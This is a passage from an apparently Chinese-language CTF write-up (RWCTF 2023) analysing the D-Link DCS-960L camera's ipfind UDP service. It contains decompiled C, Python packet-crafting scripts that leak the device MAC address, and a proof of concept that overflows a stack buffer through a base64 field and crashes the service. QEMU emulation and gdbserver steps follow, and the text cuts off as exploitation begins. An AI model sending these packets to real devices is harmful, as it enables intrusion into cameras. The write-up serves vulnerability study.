+= <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">r.sendto(p1, (ip, port))</span><br><span class="line"></span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">li(recv_data)</span><br></pre></td></tr></tbody></table></figure>

<p>最后可以接收到<code>sub_40172C</code>返回的东西</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/i/rwctf_2023&gt; python3 exp.py</span><br><span class="line">[+] open connection</span><br><span class="line">b<span class="string">'FIVI\x00\x00\x00\x01\x0b\x01\x00\x00\x00\xc0\xa8\n\xc8\x00\x16&gt;\x00\x00\x01\x00\x00\x00\x02\x00\x00D-Link\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x001.9.0\x00\x00\x00\x01\x00\x01\x00\x00\x00DCS-960L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\x00\xc0\xa8\x00\x01\xc0\xa8\x00\x01\x00\x00\x00\x00P\x00*\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></span><br></pre></td></tr></tbody></table></figure>

<h3 id="sub-40172C"><a href="#sub-40172C" class="headerlink" title="sub_40172C"></a>sub_40172C</h3><p>这个函数会获取设备的基本信息，其中里面最重要的是mac地址，因为mac地址关乎着漏洞触发点的发生</p>
<p>看一下<code>sub_400E50</code>这个函数</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400E50</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+18h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *a1 = *<span class="string">"FIVI"</span>;</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">0x1000000</span>;</span><br><span class="line">  *(a1 + <span class="number">8</span>) = <span class="number">0xB</span>;</span><br><span class="line">  v3 = *(a2 + <span class="number">10</span>) | (*(a2 + <span class="number">9</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">9</span>) = _byteswap_ushort(*(a2 + <span class="number">9</span>));</span><br><span class="line">  v4 = *(a2 + <span class="number">12</span>) | (*(a2 + <span class="number">11</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">11</span>) = _byteswap_ushort(*(a2 + <span class="number">11</span>));</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">  *(a1 + <span class="number">9</span>) = (v3 &gt;&gt; <span class="number">8</span>) | (v3 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  *(a1 + <span class="number">11</span>) = (v4 &gt;&gt; <span class="number">8</span>) | (v4 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( net_get_ifaddr(ifname, &amp;v6) &gt;= <span class="number">0</span> )</span><br><span class="line">    *(a1 + <span class="number">13</span>) = v6;</span><br><span class="line">  <span class="keyword">return</span> net_get_hwaddr(ifname, a1 + <span class="number">17</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里会调用<code>net_get_hwaddr</code>得到设备的mac地址，并会存在<code>17 - 17 + 6</code>这里</p>
<p>所以继续写一下脚本来得到mac地址</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getmac</span>(<span class="params">mac_addr</span>):</span><br><span class="line">    hex_str = binascii.hexlify(mac_addr).decode()</span><br><span class="line">    mac_addr = <span class="string">':'</span>.join([hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line">    li(<span class="string">'[+] mac = '</span> + <span class="built_in">str</span>(mac_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(recv_data) == <span class="number">0x21d</span>):</span><br><span class="line">    mac_addr = recv_data[<span class="number">0x11</span>:<span class="number">0x17</span>]</span><br><span class="line">    getmac(mac_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ll(<span class="string">"[-] recv error"</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>结果如下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/i/rwctf_2023&gt; python3 exp.py</span><br><span class="line">[+] open connection</span><br><span class="line">[+] mac = 00:16:3e:00:00:01</span><br></pre></td></tr></tbody></table></figure>

<h3 id="sub-4013F4"><a href="#sub-4013F4" class="headerlink" title="sub_4013F4"></a>sub_4013F4</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                               &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                               &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                               &amp;&amp; *&amp;user_data[<span class="number">25</span>] == <span class="string">'\x8E'</span> )</span><br><span class="line">                        {</span><br><span class="line">                          (sub_4013F4)(user_data, <span class="string">'\x8E'</span>);</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>回到主函数，继续往下看，首先v7变成2了<ul>
<li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x02\x00'</code></li>
</ul>
</li>
<li><code>net_get_hwaddr(ifname, v22) &gt;= 0</code><ul>
<li>这里就是mac地址放入了v22</li>
</ul>
</li>
<li><code>!memcmp(v21, v22, 6u)</code><ul>
<li>这里就是v21需要和v22相等</li>
<li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + mac</code></li>
</ul>
</li>
<li><code>*&amp;user_data[25] == '\x8E'</code><ul>
<li>也就是<code>user_data = 'FIVI' + '\x00\x00\x00\x00' + '\n' + '\x01\x00' + \x00\x00\x00\x00\x00\x00 + '\xff' * 6 + '\x00\x00' + '\x8E'</code></li>
</ul>
</li>
</ul>
<p>所以逆出进入4013F4的格式是</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br></pre></td></tr></tbody></table></figure>

<p>接着进入4013F4函数，漏洞点发生在<code>400f50</code>这个函数里</p>
<h3 id="sub-400F50"><a href="#sub-400F50" class="headerlink" title="sub_400F50"></a>sub_400F50</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_400F50(a1 + <span class="number">0x1D</span>, a1 + <span class="number">0x5D</span>) )</span><br></pre></td></tr></tbody></table></figure>

<p>a1就是上面的p2</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400F50</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> Group; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> Pass; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">256</span>]; <span class="comment">// [sp+18h] [-344h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">256</span>]; <span class="comment">// [sp+118h] [-244h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [sp+218h] [-144h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">68</span>]; <span class="comment">// [sp+318h] [-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  Base64decs(a1, v6);</span><br><span class="line">  Base64decs(a2, v7);</span><br><span class="line">  cfgRead(<span class="string">"USER_ADMIN"</span>, <span class="string">"Username1"</span>, v9);</span><br><span class="line">  usrInit(<span class="number">0</span>);</span><br><span class="line">  Group = usrGetGroup(v6);</span><br><span class="line">  Pass = usrGetPass(v6, v8, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Pass == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !Group &amp;&amp; !<span class="built_in">strcmp</span>(v9, v6) )</span><br><span class="line">      Pass = <span class="built_in">strcmp</span>(v7, v8) != <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    Pass = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  usrFree();</span><br><span class="line">  <span class="keyword">return</span> Pass;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在第二个<code>Base64decs(a2, v7);</code>中，会对a2进行base64解码，然后将解码之后的数据存到v7中，a2 = p2 + 0x5d，也就是0x5d后面的数据会进行base64decode到v7中，p2可控，这就造成了栈溢出漏洞</p>
<p>所以给出如下poc即可验证</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * <span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br></pre></td></tr></tbody></table></figure>

<p>p3这里就是a2，运行之后就能看到ipfind程序崩溃</p>
<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>没有真机，这里用固件模拟</p>
<p>首先准备一个bash启动脚本，里面要包含需要的东西，<code>vmlinux-3.2.0-4-4kc-malta</code>，<code>debian_wheezy_mips_standard.qcow2</code></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens32 down</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens32</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up</span><br><span class="line">sudo ifconfig ens32 0.0.0.0 promisc up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo brctl addif br0 tap0</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up</span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append <span class="string">"root=/dev/sda1 console=tty0"</span> \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></tbody></table></figure>

<p>然后还要准备一个完整的busybox和一个gdbserver，启动脚本，默认账号密码是root:root</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3e:00:00:01</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:14 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:12 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:840 (840.0 B)  TX bytes:2288 (2.2 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></tbody></table></figure>

<p>进去之后却发现eth0没有正常运行，所以我们给他加上一个ip</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig eth0 192.168.10.200/24 up</span></span><br></pre></td></tr></tbody></table></figure>

<p>此时可以看到eth0正常</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3E:00:00:01</span><br><span class="line">          inet addr:192.168.10.200  Bcast:192.168.10.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe00:1/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1028 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:219 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000</span><br><span class="line">          RX bytes:1104487 (1.0 MiB)  TX bytes:26470 (25.8 KiB)</span><br><span class="line">          Interrupt:10 Base address:0x1020</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:3 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:3 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:276 (276.0 B)  TX bytes:276 (276.0 B)</span><br></pre></td></tr></tbody></table></figure>

<p>接下来就要真正的启动固件啦</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="built_in">chroot</span> ./squashfs-root/ sh</span><br></pre></td></tr></tbody></table></figure>

<p>然后用上面的命令把固件作为主体，进行相应的挂载操作，然后启动sh，此时成功模拟出了一个固件</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~<span class="comment"># chroot ./squashfs-root/ sh</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin                                  root</span><br><span class="line">busybox-mips                         sbin</span><br><span class="line">dev                                  server</span><br><span class="line">etc                                  share</span><br><span class="line">gdbserver-7.7.1-mips-mips-i-v1-sysv  sys</span><br><span class="line">home                                 tmp</span><br><span class="line">lib                                  usr</span><br><span class="line">mnt                                  var</span><br><span class="line">mydlink                              web</span><br><span class="line">proc</span><br></pre></td></tr></tbody></table></figure>

<p>但是里面的服务还没有真正的启动，所以执行一下固件里的启动脚本</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/rc.d/rcS</span></span><br></pre></td></tr></tbody></table></figure>

<p>固件里的服务启动完毕，直接寻找一下ipfind服务</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./busybox-mips netstat -ulnp</span></span><br><span class="line">netstat: showing only processes with your user ID</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp</span><br><span class="line">udp        0      0 0.0.0.0:62720           0.0.0.0:*                           7601/ipfind</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::902                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::37004                :::*                                1606/rpc.statd</span><br><span class="line">udp        0      0 :::15167                :::*                                2306/dhclient</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到ipfind在62720这里开启了一个监听，和上面分析得一样</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line"> 7601 0         2096 S    /usr/sbin/ipfind br0</span><br><span class="line">12490 0          788 S    grep ipfind</span><br></pre></td></tr></tbody></table></figure>

<p>但是ps看了一下发现这个在br0，但是我们的有效网卡是eth0，所以kill掉这个ipfind，重新启动</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kill 7601</span></span><br><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line">26451 0          788 S    grep ipfind</span><br><span class="line"><span class="comment"># /usr/sbin/ipfind eth0 &amp;</span></span><br><span class="line"><span class="comment"># ps aux | grep ipfind</span></span><br><span class="line">28360 0         2096 S    /usr/sbin/ipfind eth0</span><br><span class="line">28440 0          788 S    grep ipfind</span><br><span class="line"><span class="comment"># ./busybox-mips netstat -ulnp</span></span><br><span class="line">netstat: showing only processes with your user ID</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 0.0.0.0:902             0.0.0.0:*                           1575/rpcbind</span><br><span class="line">udp        0      0 127.0.0.1:934           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:49110           0.0.0.0:*                           1606/rpc.statd</span><br><span class="line">udp        0      0 0.0.0.0:8166            0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 0.0.0.0:62720           0.0.0.0:*                           28360/ipfind</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           7743/ddp</span><br><span class="line">udp        0      0 0.0.0.0:62976           0.0.0.0:*                           3335/ddp</span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           2306/dhclient</span><br><span class="line">udp        0      0 :::111                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::902                  :::*                                1575/rpcbind</span><br><span class="line">udp        0      0 :::37004                :::*                                1606/rpc.statd</span><br><span class="line">udp        0      0 :::15167                :::*                                2306/dhclient</span><br></pre></td></tr></tbody></table></figure>

<p>现在就可以用gdbserver进行远程调试了，用法如下</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver-mips :6666 --attach 28360</span><br></pre></td></tr></tbody></table></figure>

<p>然后就可以用IDA或者gdb-multiarch来进行调试，笔者这里的gdb-multiarch调试失败了，所以改用了ida调试</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先肯定要确定偏移，这里用如下脚本生成垃圾数据</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 